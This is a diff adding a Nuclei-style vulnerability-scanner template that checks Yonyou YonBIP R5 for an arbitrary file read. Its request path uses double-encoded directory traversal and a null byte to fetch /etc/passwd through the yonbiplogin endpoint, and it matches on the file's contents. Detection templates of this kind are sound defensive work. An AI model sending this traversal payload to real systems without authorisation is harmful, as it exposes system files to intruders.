@@ -1,0 +1,32 @@
+id: yonbiplogin-anyfile-read
+info:
+  name: Yonyou YonBIP R5 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Yonyou YonBIP R5 flagship version contains an arbitrary file read vulnerability in the yonbiplogin endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "yonbiplogin"
